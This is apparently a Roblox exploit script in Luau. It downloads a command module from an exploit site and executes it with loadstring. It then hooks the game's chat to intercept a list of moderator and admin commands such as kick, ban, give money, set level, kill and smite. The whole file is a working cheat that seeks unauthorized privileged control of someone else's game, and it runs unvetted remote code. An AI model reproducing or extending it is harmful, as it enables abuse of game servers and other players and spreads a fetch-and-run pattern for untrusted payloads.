local TextChatService = game:GetService("TextChatService")
local Api = "https://wfybexploits.xyz/commandmodule"
local CommandModule
 
local Success, SourceCode = pcall(function()
    local response = request({
        Url = Api,
        Method = "GET"
    })
    
    if response and response.Success and response.Body then
        return response.Body
    else
        return nil
    end
end)

local CompiledFunction, CompileError = loadstring(SourceCode)
local RunSuccess, Result = pcall(CompiledFunction)

CommandModule = Result
if not CommandModule and _G.WFYBCommandModule then
    CommandModule = _G.WFYBCommandModule
end
 
local CommandSet = {
    -- VIP SERVER
    ["/vipcommands"] = true, ["/vipfreecam"] = true, ["/vipstopfreecam"] = true,
    ["/vipnextmode"] = true, ["/kick"] = true, ["/vban"] = true,
    ["/unban"] = true, ["/unbanall"] = true, ["/bans"] = true,
    -- MODERATOR
    ["/tp"] = true, ["/ff"] = true, ["/unff"] = true, ["/freecam"] = true,
    ["/stopfreecam"] = true, ["/mgivexp"] = true, ["/mgivemoney"] = true,
    ["/invisible"] = true, ["/visible"] = true, ["/spectate"] = true,
    ["/gameban"] = true, ["/ungameban"] = true, ["/globalkick"] = true,
    ["/modcommands"] = true,
    -- ADMIN 
    ["/nextmode"] = true, ["/nr"] = true, ["/givebeta"] = true, ["/removebeta"] = true,
    ["/rgivebeta"] = true, ["/maxprops"] = true, ["/rtransferdata"] = true, ["/kill"] = true,
    ["/m"] = true, ["/rs"] = true, ["/place"] = true, ["/giveweapon"] = true,
    ["/giveweapons"] = true, ["/givemoney"] = true, ["/setmoney"] = true,
    ["/rgetmoney"] = true, ["/rgivemoney"] = true, ["/rsetmoney"] = true,
    ["/givelevel"] = true, ["/rgetlevel"] = true, ["/rgivelevel"] = true,
    ["/damage"] = true, ["/damagestamina"] = true, ["/maxboats"] = true,
    ["/maxhealth"] = true, ["/ws"] = true, ["/jh"] = true, ["/uptime"] = true,
    ["/starpower"] = true, ["/smite"] = true, ["/commands"] = true
}
pcall(function()
do
TextChatService.SendingMessage:Connect(function(Message)
local MessageText = Message.Text
local SpaceIndex = string.find(MessageText, " ")
local Command
if SpaceIndex then
    Command = string.sub(MessageText, 1, SpaceIndex - 1)
else
    Command = MessageText
end
if CommandSet[Command] then
    return nil
end
end)
end
end)
